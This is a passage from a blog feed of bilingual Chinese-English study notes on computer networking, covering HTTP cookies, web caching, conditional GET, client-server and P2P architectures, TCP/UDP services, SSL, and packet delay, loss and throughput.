Found</td><td></td></tr><tr><td>505</td><td>HTTP Version Not Supported</td><td>the requested HTTP protocol version is not supported by the server</td></tr></tbody></table><h3 id="2-2-4-User-Server-Interaction-Cookies，用户与服务器的交互">2.2.4 User-Server Interaction: Cookies，用户与服务器的交互</h3><ul><li><p>it is often desirable for a Web site to identify users, either because the server wishes to restrict user access or because it wants to serve content as a function of the user identity</p><p>一个 Web 站点通常希望能够识别用户，可能是因为服务器希望限制用户的访问，或者因为它希望把内容与用户身份联系起来</p></li><li><p>cookies allow sites to keep <strong>track</strong> of users</p></li><li><p>cookie technology has four components</p><ul><li>a <strong>cookie header line</strong> in the HTTP <strong>response</strong> message</li><li>a <strong>cookie header line</strong> in the HTTP <strong>request</strong> message</li><li>a <strong>cookie file</strong> kept on the <strong>user’s end system</strong> and <u>managed by the user’s browser</u></li><li>a back-end database at the <strong>Web site</strong>，位于 Web 站点的一个后端数据库</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%822/net2.10.jpg" class=""></li><li><p>Cookies can  be used to create a <strong>user session layer</strong> on top of stateless HTTP， cookie 可以在无状态的HTTP之上建立一个用户会话层</p></li><li><p>what cookies can be used for</p><ul><li>authorization (授权)</li><li>shopping carts (购物车)</li><li>recommendations (推荐)</li><li>user session state (Web email) 用户会话状态</li></ul></li><li><p>how to keep “state”:</p><ul><li>protocol endpoints: maintain state at  sender/receiver over multiple transactions</li><li>cookies: make http messages <strong>carry state</strong>,  create a <strong>user session layer</strong> on top of  stateless http</li></ul></li></ul><h3 id="2-4-5-Web-Caching，Web缓存">2.4.5 Web Caching，Web缓存</h3><p>Cache：高速缓冲存储器</p><ul><li><p>A Web cache—also called a proxy server—is a <strong>network entity</strong> that <u>satisfies HTTP requests</u> on the behalf of an <u>origin Web server</u></p></li><li><p>goal: satisfy client request without involving origin  server</p></li><li><p>Web cache has its own <u>disk storage</u> and keeps <u>copies of recently requested objects</u> in this storag</p></li><li><p>typically proxy server is  installed by <strong>ISP</strong></p></li><li><p>过程</p><ul><li><p>The browser establishes a TCP connection to the Web cache and sends an HTTP request for the object to the Web cache</p></li><li><p>the Web cache checks to see if it has a copy of the object stored locally. If it does, the Web cache returns the object within an HTTP response message to the client browser</p></li><li><p>if the Web cache does not have the object, the Web cache opens a TCP connection to the origin server.The Web cache then sends an HTTP request for the object into the cache-to-server TCP connection. After receiving this request, the origin server sends the object within an HTTP response to the Web cache</p></li><li><p>When the Web cache receives the object, it stores a copy in its local storage and sends a copy, within an HTTP response message, to the client browser(over the <u>existing</u> TCP connection between the client browser and the Web cache)</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%822/neta.jpg" class=""></li></ul></li><li><p>在因特网上部署Web缓存器有两个原因:</p><ul><li>:small_blue_diamond:a Web cache can substantially(大幅地) reduce the <strong>response time</strong> for a client request</li><li>:small_blue_diamond: Web caches can ubstantially reduce traffic on an institution’s access link to the Internet，Web缓存器能够大大减少一个机构的接入链路到因特网的通信量</li><li>Furthermore,Web caches can substantially reduce <u>Web traffic</u> in the Internet as a whole, thereby improving performance for all applications，Web 缓存器能从整体上大大减低因特网上的 Web 流量，从而改善了所有应用的性能</li><li>Internet dense with caches:  enables “poor” content  providers to effectively  deliver content (so too does  P2P file sharing)</li></ul></li></ul><h3 id="2-2-6-The-Conditional-GET，条件GET方法">2.2.6 The Conditional GET，条件GET方法</h3><ul><li>HTTP has a mechanism that allows a cache to verify that its objects are <strong>up to date</strong></li><li>Goal<ul><li>origin server <u>don’t</u> send object if cache has <strong>up-to-date(最新的)</strong> cached  version</li></ul></li><li>判断HTTP请求是一个条件GET方法：<ul><li>the request message uses the GET method</li><li>the request message includes an If-Modified-Since: header line，请求报文中包 含一个&quot;If-Modified-Since∶&quot;首部行</li><li>origin server: response  contains <u>no</u> object if cached  copy is up-to-date:  HTTP/1.0 304 Not  Modified</li><li>304 Not Modifie：Web server s the cache that it can go ahead and forard its(the proxy cache’s) cached copy of the object to the requesting browser</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%822/net.jpg" class="">]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第二章-应用层（一）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%821/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%821/</url>
    
    <content type="html"><![CDATA[<h1>2.1 Principles of Network Applications</h1><ul><li><strong>network-core devices</strong> do not function at the <strong>application laver</strong> but instead function at lower lavers—specifically at the <strong>network layer and below</strong></li></ul><p>==》confining application software to the end systems</p><ul><li>network -core devices do  not run user applications</li></ul><h3 id="2-1-1-Network-Application-Architectures，网络应用程序体系结构">2.1.1 Network Application Architectures，网络应用程序体系结构</h3><ul><li><p><u>From the application developer’s perspective</u>, the network architecture is <strong>fixed</strong> and provides a <strong>specific set of services</strong> to application</p></li><li><p>application architecture：is designed by the <strong>application developer</strong> and dictates(规定，指定) how the <strong>application</strong> is structured over the <strong>various end systems</strong></p></li><li><p>two predominant(主导的) architectural paradigms used in modern network applications:</p><ul><li>the <strong>client-server</strong>（客户-服务器） architecture</li><li>the <strong>peer-to-peer (P2P，对等)</strong> architecture</li></ul></li><li><p><strong>client-server</strong>（客户-服务器） architecture</p><ul><li><p>server</p></li><li><p>an always-on host</p></li><li><p>rvices requests from many other hosts, called clients</p></li><li><p>client</p><ul><li>sometimes-on or always-on</li><li><u>intermittently</u> connected (间断地连接)</li><li>may have <u>dynamic</u>(动态的) IP addresses</li></ul></li><li><p><u>clients</u> do <strong>not directly</strong> <u>communicate</u> with each othe</p></li><li><p>the server has a <strong>fixed</strong>, wellknown adress, called an <strong>IP address</strong></p></li><li><p>Some of the applications with a client-server architecture include the Web, FTP, Telnet, and e-mail</p></li><li><p>a single server host is incapable of keeping up with all the requests from its clients</p><p>==》<strong>a large cluster of hosts</strong>（a <strong>data center</strong>）is often used to create a powerful <strong>virtual server</strong> in client-server architectures</p></li><li><p>Application services（应用服务程序） that are based on the client-server architecture are often <strong>infrastructure intensive</strong></p></li></ul></li><li><p>P2P architecture，P2P体系结构</p><ul><li><p>there is <strong>minimal (or no) reliance</strong> on always-on infrastructure <strong>servers</strong></p></li><li><p><strong>peers</strong>：the application exploits <strong>direct communication</strong> between pairs of <strong>intermittently</strong>(间歇地) connected hosts</p></li><li><p>The peers(对等方) are <strong>not</strong> owned by the <strong>service provider</strong>，but are instead desktops and laptops controlled by <strong>users</strong></p></li><li><p>新型流量密集型应用，e.g. IM(Instant Message),IPTV(IP网络电视),  Internet Phone, Live Streaming</p><ul><li>BitTorrent, eMule, Skpye,  PPTV, Thunder</li></ul></li><li><p>the peers communicate without passing through a dedicated server（peer-to-peer）</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%821/jw2.2b.jpg" class=""> </li><li><p>some applications have <strong>hybrid architectures</strong></p><ul><li>many instant messaging applications：<strong>servers</strong> are used to <strong>track</strong> the <strong>IP addresses</strong> of users, but user-to-user <strong>messages are sent directly</strong> between user hosts (without passing through intermediate servers)，对于许多即时讯息应用而言，服务器被用于跟踪用户的IP地址，但用户到用户的报文在用户主机之间（无需通过中间服务器）直接发送</li></ul></li><li><p>compelling features：<strong>self-scalability（自扩展性，可收缩性）</strong></p><ul><li>For example, in a P2P file-sharing application,although each peer generates workload by <strong>requesting files</strong>, each peer also <strong>adds service capacity</strong> to the system <strong>by distributing files to other peers</strong>，在一个P2P文件共享应用中，尽管每个对等方都由于请求文件产生工作量，但每个对等方通过向其他对等方分发文件也为系统增加服务能力</li><li>new  peers bring new <strong>service  capacity</strong>, as well as new <strong>service  demands</strong></li></ul></li><li><p>cost effective</p><ul><li>they normally don’t require significant <u>server infrastructure</u> and <u>server bandwidth</u></li></ul></li><li><p>major challenges：</p></li><li><p>ISP Friendly</p><ul><li>most residential ISPs(including DSL and cable ISPs) have been dimensioned for “<strong>asymmetrical</strong>” bandwidth usage</li><li>P2P <strong>video streaming</strong> and <strong>file distribution applications</strong> <u>shift</u> <strong>upstream</strong> traffic from servers to residential ISPs, thereby putting significant <strong>stress</strong> on the ISPs</li></ul></li><li><p>security</p><ul><li>highly distributed and open nature，高度分布和开放特性</li></ul></li><li><p>Incentives</p><ul><li>The success of future P2P applications also depends on convincing users to volunteer bandwidth, storage, and computation resources to the applications</li></ul></li></ul></li><li><p>hybrid of client-server and P2P</p><ul><li>Instant messaging applications<ul><li>centralized service: client presence detection/location<ul><li>user registers its IP address with central server when it  comes online</li><li>user contacts central server to find IP addresses of  buddies</li></ul></li><li>chatting between two users is P2P</li></ul></li><li>Skype(网络电话)<ul><li>voice-over-IP (VoIP) P2P application</li><li>centralized server: finding address of remote party</li><li>client-client connection: direct (not through server)</li></ul></li></ul></li></ul><h3 id="2-1-2-Processes-Communicating">2.1.2 Processes Communicating</h3><ul><li>In the jargon of operating systems,it is not actually programs but <strong>processes</strong> that communicate</li><li>when processes are running on the <strong>same end system</strong>, they can communicate with each other with <strong>inter-process communication</strong>（IPC，进程间通信）, using rules that are governed by the <strong>end system’s operating system</strong></li><li>:star:processes on two different end systems communicate with each other by <u>exchanging messages</u>（报文） across the computer network<ul><li>sending process: creates and sends messages into the  network</li><li>receiving process: receives these messages and possibly  responds by sending messages back</li></ul></li></ul><h5 id="1-Client-and-Server-Processes">1.Client and Server Processes</h5><ul><li><p><u><strong>A network application</strong> consists of <strong>pairs of processes</strong></u> that send messages to each other over a network（label one of the two processes as the client and the other process as the server)</p><ul><li>in the Web application a <strong>client browser process</strong> exchanges messages with a <strong>Web server process</strong></li><li>In a P2P file-sharing system,a file is transferred from a process in one peer to a process in another peer</li></ul></li><li><p>define the client and server processes as follows:</p><p><em>In the context of a communication session between a pair of processes, the process that <strong>initiates</strong> the communication(that is, initially contacts the other process at the beginning of the session)is labeled as the <strong>client</strong>.The process that <strong>waits</strong> to be contacted to begin the session is the <strong>server</strong></em></p></li><li><p>sometimes also use the terminology “client side and server side of an application”</p></li></ul><h5 id="2-The-Interface-Between-the-Process-and-the-Computer-Network，进程与计算机网络之间的接口">2.The Interface Between the Process and the Computer Network，进程与计算机网络之间的接口</h5><ul><li><p>Any message sent from one process to another must go through the <strong>underlying network</strong></p></li><li><p>A process sends messages into, and receives messages from, the network through a <strong>software interface</strong> called a <strong>socket</strong>（套接字）</p></li><li><p>a socket is the <strong>interface</strong> between the application layer and the transport layer <strong>within a host</strong></p></li><li><p>It is also referred to as the <strong>Application Programming Interface(<em>API，应用程序编程接口</em>）</strong> between the application and the network, since the socket is the programming interface with which network applications are built（建立网络应用程序的可编程接口）</p></li><li><p>The only control that the application developer has on the <strong>transport-layer</strong> side is</p><ul><li>the choice of <strong>transport protocol</strong></li><li>perhaps the ability to fix a few <strong>transport-layer parameters</strong>，such as maximum buffer and maximum segment sizes最大缓存和最大报文段长度</li></ul></li></ul><h5 id="3、进程寻址">3、进程寻址</h5><ul><li>主机由其IP地址（IP address）标识</li><li>to receive messages, process  must have <strong>identifier</strong></li><li>an IP address is a <strong>32-bit</strong> quantity（uniquely identifying the host）</li><li>除了知道报文送往目的地的主机地址外，发送进程还必须指定运行在接收主机上的接收进程（更具体地说，接收套接字），端口号（port number）用于此</li></ul><h5 id="App-layer-protocol-defines">App-layer protocol  defines</h5><ul><li>types of messages exchanged<ul><li>request, response</li></ul></li><li>message syntax (语法)<ul><li>what fields in messages &amp;  how fields are delineated(描绘)</li></ul></li><li>message semantics (语义)<ul><li>meaning of information in  fields</li></ul></li><li>rules for when and how  processes send &amp; respond to  messages</li><li>open protocols (公开协议)<ul><li>defined in RFCs</li><li>allows for interoperability( 互通性)</li><li>HTTP, SMTP</li></ul></li><li>proprietary protocols (私有协议)<ul><li>Skype, QQ, Thunder</li></ul></li></ul><h3 id="2-1-3-Transport-Services-Available-to-Applications，可供应用程序使用的运输服务">2.1.3 Transport Services Available to Applications，可供应用程序使用的运输服务</h3><ul><li>在<u>发送端的应用程序</u>将报文推进该套接字，在该套接字的另一侧，<u>运输层协议</u>负责使该报文进入接收进程的套接字</li><li>the possible services that a transport-layer protocol can offer：<ul><li>reliable data transfer，可靠数据传输</li><li>throughput</li><li>timing，定时</li><li>security</li></ul></li></ul><h6 id="reliable-data-transfer">reliable data transfer</h6><ul><li>data loss can have devastating consequences（灾难性的后果）<ul><li>electronic mail</li><li>file transfer</li><li>remote host access，远程主机访问</li><li>Web document transfers</li><li>financial applications，金融应用</li></ul></li><li>reliable data transfer：the data sent by one end of the application is delivered correctly and completely to the other end of the application，应用程序的一端发送的数据正确、完全地交付给该应用程序的另一端</li><li>One important service that a <strong>transport-layer protocol</strong> can potentially provide to an <strong>application</strong> is <strong>process-to-process reliable data transfer</strong>（可靠数据传输）</li><li>loss-tolerant applications（容忍丢失的应用）：</li><li>real-time audio/video</li><li>stored audio/video</li></ul><h6 id="Throughput">Throughput</h6><ul><li>throughput：in the conext of a communication session between two processes along a network path is the <strong>rate</strong> at which the sending process can deliver bits to the receiving proces，在沿着一条网络路径上的两个进程之间的通信会话场景中，<u>可用吞吐量</u>就是发送进程能够向接收进程<strong>交付比特的速率</strong></li><li>the available throughput can fluctuate with time</li><li>transport-layer protocol could provide another natural service：guaranteed <strong>available throughput</strong> at some <strong>specified rate</strong></li><li>With such a service,，the application could <u>request a guaranteed throughput</u> of r bits/sec，and the transport protocol would then <strong>ensure</strong> that the <u>available throughput</u> is always at <strong>least</strong> r bits/sec</li><li><strong><em>bandwidth-sensitive applications</em>（宽带敏感的应用）</strong>：Applications that have throughput requirements<ul><li>Many current <u>multimedia applications</u> are bandwidth sensitive, although some multimedia applications may use <strong>adaptive coding techniques</strong> to encode at a rate that matches the currently available throughpu</li></ul></li><li><strong><em>elastic applications</em>（弹性应用）</strong>：can make use of as much,or as little, throughput as happens to be available<ul><li>Electronic mail</li><li>file transfer</li><li>Web transfers，web传送</li></ul></li></ul><h6 id="Timing（定时）">Timing（定时）</h6><ul><li>A transport-layer protocol can also provide <strong>timing guarantees</strong></li><li>Internet telephony、virtual environments、teleconferencing、multiplayer games</li><li>For non-real-time applications, lower delay is alwavs preferable to higher delay, but no tight constraint is placed on the end-to-end delays</li></ul><h6 id="Security">Security</h6><ul><li>a transport protocol can provide an application with <strong>one or more security services</strong></li><li><u>in the sending host</u>, a <u>transport protocol</u> can <strong>encrypt</strong> <u>all data</u> transmitted by the sending process,<u>and in the receiving host</u>, the transport-layer protocol can <strong>decrypt</strong> the data <strong>before</strong> delivering the data to the receiving process</li></ul><h3 id="2-1-4-Transport-Services-Provided-by-the-Internet，特网提供的运输服务">2.1.4 Transport Services Provided by the Internet，特网提供的运输服务</h3><ul><li>The Internet (and, more generally, TCP/IP networks) makes two <strong>transport protocols</strong> available to applications<ul><li>UDP</li><li>TCP</li></ul></li><li>选择网络应用的要求</li></ul><table><thead><tr><th>Application</th><th>Datat Loss</th><th>Bindwidth</th><th>Time-Sensitive</th></tr></thead><tbody><tr><td>file tansfer</td><td>no loss</td><td>elastic</td><td>no</td></tr><tr><td>e-mail</td><td>no loss</td><td>elastic</td><td>no</td></tr><tr><td>web document</td><td>no loss</td><td>elastic(few kbps)</td><td>no</td></tr><tr><td>Internet telephone/video conferecing</td><td>loss-tolerant</td><td>audio:few kbps-1Mbps<br />video:10kbps-5Mbps</td><td>yes:100s of msec</td></tr><tr><td>stored audio/video</td><td>loss-tolerant</td><td>same as above</td><td>yes:few seconds</td></tr><tr><td>Interactive games,交互式游戏</td><td>loss-tolerant</td><td>few kbps-10kbps</td><td>yes:100s of msec</td></tr><tr><td>instan messaging</td><td>no loss</td><td>elastic</td><td>yes and no</td></tr></tbody></table><h6 id="TCP-Services">TCP Services</h6><ul><li>TCP service=<strong>connection-oriented</strong> service + <strong>reliable data transfer</strong> service，TCP服务模型=面向连接服务+可靠数据传输服务</li><li>connection-oriented service<ul><li><u>before</u> the <u>application</u>-level messages begin to flow，TCP has the client and server exchange <strong><u>transport</u>-layer control information</strong> with each other （handshaking procedure：prepare for an onslaught of packets）</li><li><u>After</u> the handshaking phase，a <strong>TCP connection</strong> is said to exist between the <strong>sockets</strong> of the two processes</li><li>The connection is a <strong>full-duplex connection</strong>（全双工）：the two processes can send messages to each other <u>over the connection at the same time</u></li><li>When the application <u>finishes</u> sending messages, it must <strong>tear down the connection</strong></li><li>the two processes are connected in a very <u>loose manner</u></li></ul></li><li>reliable data transfer service<ul><li>deliver <strong>all data</strong> sent <strong>without error</strong> and in the <strong>proper order</strong>，无差错、按适当顺序交付所有发送的数据</li><li>no missing or <u>duplicate</u> bytes，没有字节的丢失和冗余</li></ul></li><li>TCP also includes a <strong>congestion-control mechanism</strong>（拥塞控制机制）（a service for the general welfare of the Internet rather than for the direct benefit of the communicating processes）<ul><li>The TCP congestion-control mechanism <u>throttles a sending process</u>(client or server) when the network is congested between sender and receiver</li><li>TCP congestion control also attempts to <strong>limit each TCP connection</strong> to its <strong>fair share</strong> of <u>network bandwidth</u>，TCP拥塞控制也试图限制每个TCP连接、使它们达到公平共享网络带宽的目的</li></ul></li><li>summary<ul><li>reliable transport可靠传输、flow control流量控制、congestion control拥塞控制、connection-oriented面向连接</li><li>no：<ul><li>timing、minimum throughput guarantee(最低保证吞吐量)、security</li></ul></li></ul></li></ul><h6 id="UDP-Services">UDP Services</h6><ul><li><strong>no-frills、lightweight、providing minimal services、connectionless</strong>（=》no handshaking）</li><li>provides an <strong>unreliable</strong> data transfer service<ul><li>no guarantee that the message will ever <u>reach</u> the receiving process. Furthermore, messages that do arrive at the receiving process may arrive <u>out of order</u>，乱序</li></ul></li><li>does not include a <strong>congestion-control mechanism</strong><ul><li>the sending side of UDP can pump data into the layer below(the network layer) <strong>at any rate</strong> it pleases</li><li>the actual end-to-end throughput may be <u>less</u> than this rate due to the <u>limited bandwidth</u> of intervening links or due to <u>congestion</u></li></ul></li><li>summary<ul><li>does not provide: reliability，flow control，congestion  control，timing，throughput  guarantee，security，connection setup</li></ul></li></ul><h6 id="focus-on-security">focus on security</h6><ul><li><p>Neither TCP nor UDP provide any encryption</p></li><li><p><strong>Secure Sockets Layer(SSL，安全套接字层）</strong>：an enhancement for TCP</p></li><li><p>not only···（TCP），also provides critical process-to-process security services</p><ul><li>encryption</li><li>data integrity，数据完整</li><li>end-point authentication，端点鉴别</li></ul></li><li><p>:star:SSL is not a third Internet transport protocol,on the same level as TCP and UDP, but instead is an enhancement of TCP，with the enhancements being implemented in the <strong>application layer</strong>，SSL 不是与TCP和 UDP在相同层次上的第三种因特网 运输协议，而是一种对TCP的加强，这种强化是在<strong>应用层</strong>上实现的</p></li><li><p>if an application wants to use the services of SSL, it needs to include SSL code  in <u>both</u> the client and server sides of the applicaion</p></li><li><p>SSL has is own socket API that is similar to the traditional TCP socket API</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E5%BA%94%E7%94%A8%E5%B1%821/142150.jpg" class=""></li><li><p>about throughput or timing guarantees（services not provided by today’s Internet transport protocol）（in ch.7）</p><ul><li>today’s Internet can often provide satisfactory service to time-sensitive applications, but it cannot provide any timing or bandwidth guarantees，今天的因特网通常能够为时间敏感应用提供满意的 服务，但它不能提供任何定时或带宽保证</li></ul></li><li><p>一些流行的因特网应用所使用的运输协议：</p><ul><li>telephony typically runs over UDP<ul><li>Each side of an Internet phone application needs to send data across the network at some minimum rate.this is more likely to be possible with UDP than with TCP</li><li>Also,Internet phone applications are loss-tolerant, so they do not need the reliable data transfer service provided by TCP.因为因特网电话应用（如Skype）<u>通常能够容忍某些丢失</u>但要求<u>达到一定的最小速率</u>才能有效工作，所以常将该应用运行在 UDP上，从而设法避开 TCP 的<u>拥塞控制机制和分组开销</u></li><li>但因为许多防火墙被配置成阻挡（大多数类型的）UDP流量，所以因特网电话应用通常设计成<u>如果 UDP通信失败就使用 TCP 作为备份</u></li></ul></li></ul></li></ul><table><thead><tr><th>Application</th><th>Application-Layer Protocol<br />应用层协议</th><th>Underlying Transport Protocol<br />支撑的运输层协议</th></tr></thead><tbody><tr><td>Electronic mail</td><td>SMTP</td><td>TCP</td></tr><tr><td>Remote terminal access</td><td>Telnet，远程终端协议</td><td>TCP</td></tr><tr><td>Web</td><td>HTTP</td><td>TCP</td></tr><tr><td>File transfer</td><td>FTP，文件传输协议</td><td>TCP</td></tr><tr><td>Streaming multimedia</td><td>HTTP,RTP（实时传输协议）</td><td>TCP or UDP</td></tr><tr><td>Internet telephony</td><td>SIP（会话初始化协议）,RTP,or proprietary(专用的)</td><td>Typically UDP</td></tr></tbody></table><h5 id="other">other</h5><ul><li>throughput or timing guarantees services not provided by  today’s Internet transport protocols</li><li>Internet can often provide satisfactory service to time-sensitive applications, <strong>cannot provide any timing or throughput guarantees</strong></li></ul><h3 id="2-1-5-Application-Layer-Protocols">2.1.5 Application-Layer Protocols</h3><ul><li>An <u>application-layer protocol</u> defines how an application’s processes, running on different end systems, pass messages to each other：<ul><li>The <u>types</u> of messages exchanged，交换的报文类型<ul><li>for example, request messages and response messages</li></ul></li><li>The <u>syntax</u> of the various message types，各种报文类型的语法<ul><li>such as the <u>fields</u> in the message and how the fields are <u>delineated</u>，报文中的各个字段及这些字段是如何描述的</li></ul></li><li>The <u>semantics</u> of the fields，字段的语义<ul><li>the <u>meaning</u> of the information in the fields</li></ul></li><li><u>Rules</u> for determining when and how a process sends messages and responds to messages，一个进程何时以及如何发送报文，对报文进行响应的规则</li></ul></li><li>Some application-layer protocols are specified in RFCs and are therefore in the public domain<ul><li>For example, the Web’s application-layer protocol, HTTP(the HyperText Transfer Protocol is available as an RFC</li></ul></li><li>Many other application-layer protocols are proprietary（专用的）<ul><li>many existing P2P file-sharing systems use proprietary application-layer protocols：Skype</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第一章-计算机网络和因特网（一）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%912/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%912/</url>
    
    <content type="html"><![CDATA[<h1>1.4分组交换网络中的时延、丢包和吞吐量</h1><h3 id="1-4-1分组交换网中的时延概述">1.4.1分组交换网中的时延概述</h3><ul><li><p>节点总时延（total node delay）=节点处理时延（nodal processing delay）+排队时延（queuing delay）+传输时延（transmission delay）+传播时延（propagation ddelay）</p><ul><li>仅当在<strong>该链路</strong>没有其他分组<strong>正在传输</strong>并且没有其他分组<strong>排在该队列前面</strong>时，才能在这条链路上传输该分组</li><li>如果该链路当前正繁忙或没有其他分组已经在该链路上排队，则新到达的分组将参与排队</li></ul></li><li><p>处理时延，d~proc~: nodal processing delay</p><ul><li><u>检查分组首部、决定将该分组导向何处所需要的时间</u></li><li>检查比特级别的差错（该差错出现在上游结点向该路由器传输这些分组比特的过程中）check bit errors</li><li>determine <strong>output link</strong></li><li><strong>微秒</strong>或更低的数量级</li></ul></li><li><p>排队时延，d~queue~：queueing delay</p><ul><li>在队列中，当分组在链路上等待传输时。time waiting at output link  for transmission</li><li>一个特定分组的排队时延长度取决于：先期到达的正在排队等待向链路传输的分组数量。depends on congestion level  of router</li><li><strong>毫秒</strong>到<strong>微秒</strong>量级</li></ul></li><li><p>传输时延，d~trans~: transmission delay</p><ul><li><strong>L/R</strong>（将<strong>所有分组的比特</strong>推（传输）向链路所需要的时间。the amount of time required  to transmit (push) all of the  packet’s bits into the link），L：比特，分组长度，R：，bps（b/s），两个路由器之间 的链路传输速率）</li><li><strong>毫秒</strong>到<strong>微秒</strong>量级</li></ul></li><li><p>传播时延，d~prop~: propagation delay</p><ul><li><p>the time required to propagate  from the beginning of the link to  next router</p></li><li><p>取决于物理链路，范围2×10^8^ ~ 3×10^8^m/s，等于或略小于光速</p></li><li><p>传播时延=<strong>d/s</strong>（d：两个路由器之间的距离，s：链路的传播速率）</p></li><li><p>在广域网中，传播时延为<strong>毫秒</strong>量级</p></li></ul></li></ul><table><thead><tr><th></th><th>结点处理时延（d~proc~)</th><th>排队时延(d~queue~)</th><th>传输时延(d~trans~)</th><th>传播时延(d~prop~)</th></tr></thead><tbody><tr><td>量级</td><td>微秒or&lt;</td><td>毫秒到微秒</td><td>毫秒到微秒<br />microsecond to millisecond</td><td>毫秒</td></tr><tr><td>备注</td><td>对于由同步卫星链路互联的两台路由器来说是几百毫秒</td><td></td><td>对于10Mbps和更高的传输速率（如对于LAN）而言是微不足道的<br />对于通过低速拨号调制解调器链路发送的长因特网分组而言，可能是数百毫秒</td><td></td></tr></tbody></table><ul><li>处理时延通常是微不足道的，但它对一台路由器的最大吞吐量有重要影响。最大吞吐量：一台路由器能够转发分组的最大速率</li></ul><h3 id="1-4-2排队时延和丢包">1.4.2排队时延和丢包</h3><ul><li><p>衡量排队时延：流量到达该队列的速率、链路的传输速率、到达流量的性质（流量是周期性到达还是以突发形式到达）</p></li><li><p><strong>流量强度（<em>tranffic intensity</em>）</strong>=La/R</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%912/net.jpg" class=""><ul><li><p>L：分组由L比特组成，packet length (bits)；a：分组到达队列的平均速率，以bps即b/s为单位，average packet arrival  rate (packets/s)；R：传输速率，transmission rate (bps)；La：比特到达队列的平均速率</p></li><li><p>La/R&gt;1：比特到达队列的平均速率超过从该队列传输出去的速率，排队时延趋于无穷大，La/R &gt; 1: more “work” arriving than can be  serviced, average delay infinite</p></li><li><p>La/R≤1：</p><ul><li>到达流量的性质影响排队时延</li><li>如果分组周期性到达（每L/R秒到达一个分组），则每个分组将到达一个空队列中，不会有排队时延</li><li>如果分组以突发形式到达，则有很大的突发时延<ul><li>假若每（L/R）N秒同时到达N个分组，则传输的第一个分组没有排队时延，传输的第二个分组就有L/R秒的排队时延</li><li>一般地，din个传输的分组有（n-1）L/R秒的排队时延</li></ul></li></ul></li><li><p>La/R-&gt;0：平均排队时延接近0</p></li><li><p>La/R-&gt;1：存在到达率超过传输能力的时间间隔，这时将形成队列，queueing delay large</p><ul><li><p>随着流量强度接近1，平均排队时延迅速增加</p></li><li><p>高速路一场车祸—》全段堵车</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%80%E7%AB%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%92%8C%E5%9B%A0%E7%89%B9%E7%BD%912/net1.18.jpg" class=""></li></ul></li></ul></li><li><p>丢包</p><ul><li>排队容量有限，随着流量强度接近1，排队时延并不实际取项无穷大</li><li>当到达的分组发现一个满的队列，路由器将丢弃（drop）该分组，即该分组将会丢失（lost）</li><li>lost packet may be retransmitted by <strong>previous node</strong>, by <strong>source end system</strong>, or <strong>not at all</strong></li></ul></li><li><p>衡量一个结点的性能：时延、分组丢失的概率</p></li></ul><h3 id="1-4-3端到端时延">1.4.3端到端时延</h3><ul><li><p>假设源主机和目的主机之间有N-1台路由器，无拥塞（此时排队时延微不足道）：</p><p>d~end-end~=N(d~proc~+d~trans~+d~prop~)</p></li></ul><h3 id="1-4-4计算机网络中的吞吐量">1.4.4计算机网络中的吞吐量</h3><ul><li><p>Throughput(吞吐量): rate (bits/time unit) at which bits  transferred between sender/receiver</p></li><li><p>计算机网络的性能衡量：时延、丢包、端到端吞吐量</p></li><li><p><strong>瞬时吞吐量（<em>instantaneous throughput</em>）</strong>：任一瞬间主机接收另一主机发送的文件的速率（bps），rate at given point in time</p></li><li><p><strong>平均吞吐量（<em>average throughput</em>）</strong>=F/T （bps，F的单位是比特），rate over longer period of time</p></li></ul><h1>1.5协议层次及其服务类型</h1><h3 id="1-5-1分层的体系结构">1.5.1分层的体系结构</h3><ul><li><p>每个层次提供服务的方式：</p><ul><li>在该层中执行了某些动作，performing its own internal-layer(内层) actions</li><li>使用直接下层的服务，relying on services provided by layer below</li></ul></li><li><p>协议分层</p><ul><li>优：<ul><li>提供结构化方式来讨论系统组件</li><li>explicit structure allows identification, relationship of complex system’s pieces</li><li>modularization eases maintenance, updating of system 降低维护和更新成本</li></ul></li><li>缺：<ul><li>一层可能冗余较低层的功能。例如，许多协议栈在基于每段链路和基于端到端两种情况下，都提供了差错恢复，one layer may duplicate lower-layer functionality</li><li>某层的功能可能需要仅在其他层才出现的信息（如时间戳值），functionality at one layer may need information (e.g.  timestamp value) that is present only in another layer</li></ul></li><li>各层的所有协议被称为<strong>协议栈（<em>protocol stack</em>）</strong></li></ul></li><li><p>五层因特网协议栈</p><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">分组的名称</th></tr></thead><tbody><tr><td style="text-align:center">应用层</td><td style="text-align:center">message</td></tr><tr><td style="text-align:center">运输层</td><td style="text-align:center">报文段segment</td></tr><tr><td style="text-align:center">网络层</td><td style="text-align:center">数据段datagram</td></tr><tr><td style="text-align:center">链路层</td><td style="text-align:center">帧frame</td></tr><tr><td style="text-align:center">物理层</td><td 